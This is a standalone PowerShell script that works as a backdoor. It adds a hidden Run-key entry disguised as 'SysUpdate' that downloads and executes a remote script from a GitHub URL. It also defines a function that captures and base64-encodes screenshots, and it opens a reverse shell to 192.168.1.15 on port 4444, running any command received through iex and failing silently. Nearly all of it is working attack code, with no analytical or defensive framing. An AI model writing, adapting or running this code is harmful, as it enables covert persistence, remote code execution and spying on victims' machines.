# 1. Fixed Registry (No more crashing on property checks)
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "SysUpdate"
$payload = "powershell.exe -WindowStyle Hidden -NoProfile -Command IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/B15cu1t/shell.ps1/main/shell_v2.ps1')"

# Use a basic check that won't throw a terminating error
if (-not (Get-ItemProperty $regPath -Name $regName -ErrorAction SilentlyContinue)) {
    New-ItemProperty -Path $regPath -Name $regName -Value $payload -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null
}

# 2. Assemblies (Only the basics)
Add-Type -AssemblyName System.Windows.Forms, System.Drawing

# 3. Screenshot Function
function Get-Screenshot {
    try {
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $image  = New-Object Drawing.Bitmap($screen.Width, $screen.Height)
        $graphic = [Drawing.Graphics]::FromImage($image)
        $graphic.CopyFromScreen($screen.Location, [Drawing.Point]::Empty, $screen.Size)
        
        $ms = New-Object System.IO.MemoryStream
        $image.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        $base64 = [Convert]::ToBase64String($ms.ToArray())
        
        $graphic.Dispose(); $image.Dispose(); $ms.Dispose()
        return $base64
    } catch { return "Screenshot Error: $($_.Exception.Message)" }
}

# 4. The Core Reverse Shell Engine
$ip = '192.168.1.15'
$port = 4444

# Using a robust socket connection method
$client = New-Object System.Net.Sockets.TCPClient
try {
    $client.Connect($ip, $port)
    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $buffer = New-Object byte[] 8192
    $encoding = New-Object System.Text.ASCIIEncoding

    # Initial Header
    $writer.WriteLine("--- Shell Active: $($env:COMPUTERNAME) ---")
    $writer.Write("PS " + (Get-Location).Path + "> ")
    $writer.Flush()

    while (($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
        $data = $encoding.GetString($buffer, 0, $i).Trim()
        if (!$data) { continue }
        
        # Check for special commands FIRST
        if ($data -eq "screenshot") {
            $output = Get-Screenshot
        } elseif ($data -eq "exit") {
            break
        } else {
            # Run the command and catch errors
            $output = try { iex $data 2>&1 | Out-String } catch { $_.Exception.Message }
        }

        # Send back result + new prompt
        $writer.WriteLine($output)
        $writer.Write("PS " + (Get-Location).Path + "> ")
        $writer.Flush()
    }
} catch {
    # Fail silently to avoid pop-ups
} finally {
    if ($client.Connected) { $client.Close() }
}
